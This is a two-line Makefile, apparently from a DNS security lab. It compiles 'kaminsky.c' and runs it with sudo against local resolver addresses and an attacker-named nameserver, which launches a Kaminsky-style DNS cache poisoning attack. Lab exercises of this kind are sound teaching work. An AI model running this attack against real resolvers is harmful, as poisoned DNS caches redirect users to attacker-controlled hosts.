all:
	gcc -g kaminsky.c
	sudo ./a.out 127.0.0.1 127.0.0.2 ns.dnslabattacker.net 199.43.135.53 6.6.6.6 9999 64000